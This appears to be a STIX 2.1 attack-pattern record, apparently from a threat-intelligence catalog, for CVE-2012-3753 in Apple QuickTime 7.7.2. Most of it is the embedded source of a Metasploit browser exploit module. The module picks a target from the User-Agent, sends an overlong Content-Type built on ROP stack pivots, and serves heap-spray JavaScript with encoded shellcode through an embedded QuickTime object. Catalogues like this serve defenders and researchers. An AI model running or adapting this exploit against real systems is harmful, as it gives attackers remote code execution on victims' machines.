{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7051375d-ce1c-40a1-be46-b6d4d1efecb9",
    "created": "2024-08-14T16:40:05.267614Z",
    "modified": "2024-08-14T16:40:05.267618Z",
    "name": "Apple QuickTime 7.7.2 MIME Type Buffer Overflow",
    "description": " This module exploits a buffer overflow in Apple QuickTime 7.7.2. The stack based overflow occurs when processing a malformed Content-Type header. The module has been tested successfully on Safari 5.1.7 and 5.0.7 on Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_mime_type.rb",
            "external_id": "apple_quicktime_mime_type.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3753"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT5581"
        },
        {
            "source_name": "reference",
            "url": "http://asintsov.blogspot.com.es/2012/11/heapspray.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::RopDb\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::SAFARI,\n  #  :ua_maxver  => '5.0.1',\n  #  :ua_maxver  => '5.1.7',\n  #  :javascript => true,\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #  :vuln_test  => nil\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime 7.7.2 MIME Type Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Apple QuickTime 7.7.2. The stack\n        based overflow occurs when processing a malformed Content-Type header. The module\n        has been tested successfully on Safari 5.1.7 and 5.0.7 on Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'Pavel Polischouk', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-3753' ],\n          [ 'OSVDB', '87088'],\n          [ 'BID', '56438' ],\n          [ 'URL', 'http://support.apple.com/kb/HT5581' ],\n          [ 'URL', 'http://asintsov.blogspot.com.es/2012/11/heapspray.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          # Tested with QuickTime 7.7.2\n          [ 'Automatic', {} ],\n          [ 'Windows XP SP3 / Safari 5.1.7 / Apple QuickTime Player 7.7.2',\n            {\n              'OffsetFirstStackPivot' => 389,\n              'OffsetSecondStackPivot' => 105,\n              'FirstStackPivot' => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,\n              'SecondStackPivot' => 0x67123437, # pop esp / ret # Quicktime.qts\n              'SprayOffset' => 264,\n              'SprayedAddress' => 0x60130124\n            }\n          ],\n          [ 'Windows XP SP3 / Safari 5.0.5 / Apple QuickTime Player 7.7.2',\n            {\n              'OffsetFirstStackPivot' => 389,\n              'OffsetSecondStackPivot' => 105,\n              'FirstStackPivot' => 0x671a230b, # ADD ESP,4B8 # RETN # Quicktime.qts,\n              'SecondStackPivot' => 0x67123437, # pop esp / ret # Quicktime.qts\n              'SprayOffset' => 264,\n              'SprayedAddress' => 0x60130124\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n\n    browser_name = \"\"\n    if agent =~ /Safari/ and agent=~ /Version\\/5\\.1\\.7/\n      browser_name = \"Safari 5.1.7\"\n    elsif agent =~ /Safari/ and agent=~ /Version\\/5\\.0\\.5/\n      browser_name = \"Safari 5.0.5\"\n    end\n\n    os_name = 'Windows XP SP3'\n\n    targets.each do |t|\n      if (!browser_name.empty? and t.name.include?(browser_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def on_request_uri(client, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    if request.uri =~ /\\.smil$/\n      print_status(\"Sending exploit (target: #{my_target.name})\")\n      smil = rand_text_alpha(20)\n      type = rand_text_alpha_lower(1)\n      subtype = rand_text_alpha_lower(my_target['OffsetSecondStackPivot'])\n      subtype << [my_target['SecondStackPivot']].pack(\"V\")\n      subtype << [my_target['SprayedAddress']].pack(\"V\")\n      subtype << rand_text_alpha_lower(my_target['OffsetFirstStackPivot'] - subtype.length)\n      subtype << rand_text_alpha_lower(4)\n      subtype << [my_target['FirstStackPivot']].pack(\"V\")\n      subtype << rand_text_alpha_lower(10000 - subtype.length)\n      send_response(client, smil, { 'Content-Type' => \"#{type}/#{subtype}\" })\n    else\n      print_status(\"Sending initial HTML\")\n      url =  ((datastore['SSL']) ? \"https://\" : \"http://\")\n      url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])\n      url << \":\" + datastore['SRVPORT'].to_s\n      url << get_resource\n      fname = rand_text_alphanumeric(4)\n\n      code = generate_rop_payload('msvcrt', payload.encoded, {'target'=>'xp'})\n      js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(my_target.arch))\n      offset = rand_text(my_target['SprayOffset'])\n      js_offset = Rex::Text.to_unescape(offset, Rex::Arch.endian(my_target.arch))\n      fill = rand_text(4)\n      js_fill = Rex::Text.to_unescape(fill, Rex::Arch.endian(my_target.arch))\n\n      # Heap Spray based on http://asintsov.blogspot.com.es/2012/11/heapspray.html\n      js = <<-JSSPRAY\nfunction heapSpray(offset, shellcode, fillsled) {\n  var chunk_size, headersize, fillsled_len, code;\n  var i, codewithnum;\n  chunk_size = 0x40000;\n  headersize = 0x10;\n  fillsled_len = chunk_size - (headersize + offset.length + shellcode.length);\n  while (fillsled.length <fillsled_len)\n    fillsled += fillsled;\n  fillsled = fillsled.substring(0, fillsled_len);\n  code = offset + shellcode + fillsled;\n  heap_chunks = new Array();\n  for (i = 0; i<1000; i++)\n  {\n    codewithnum = \"HERE\" + code;\n    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);\n  }\n}\nvar myoffset = unescape(\"#{js_offset}\");\nvar myshellcode = unescape(\"#{js_code}\");\nvar myfillsled = unescape(\"#{js_fill}\");\nheapSpray(myoffset,myshellcode,myfillsled);\n      JSSPRAY\n\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n      end\n\n      content =  \"<html>\"\n      content << \"<head><script>\"\n      content << \"#{js}\"\n      content << \"</script></head>\"\n      content << \"<body>\"\n      content << <<-ENDEMBED\n<OBJECT\nCLASSID=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\"\nWIDTH=\"1\"\nHEIGHT=\"1\"\nCODEBASE=\"http://www.apple.com/qtactivex/qtplugin.cab\">\n<PARAM name=\"SRC\"        VALUE = \"#{url}/#{fname}.smil\">\n<PARAM name=\"QTSRC\"      VALUE = \"#{url}/#{fname}.smil\">\n<PARAM name=\"AUTOPLAY\"   VALUE = \"true\"               >\n<PARAM name=\"TYPE\"       VALUE = \"video/quicktime\"    >\n<PARAM name=\"TARGET\"     VALUE = \"myself\"             >\n<EMBED\n  SRC        = \"#{url}/#{fname}.smil\"\n  QTSRC      = \"#{url}/#{fname}.smil\"\n  TARGET     = \"myself\"\n  WIDTH      = \"1\"\n  HEIGHT     = \"1\"\n  AUTOPLAY   = \"true\"\n  PLUGIN     = \"quicktimeplugin\"\n  TYPE       = \"video/quicktime\"\n  CACHE      = \"false\"\n  PLUGINSPAGE= \"http://www.apple.com/quicktime/download/\" >\n</EMBED>\n</OBJECT>\n      ENDEMBED\n      content << \"</body></html>\"\n      send_response(client, content, { 'Content-Type' => \"text/html\" })\n    end\n\n    # Handle the payload\n    handler(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-07",
    "x_mitre_platforms": [
        "win'"
    ]
}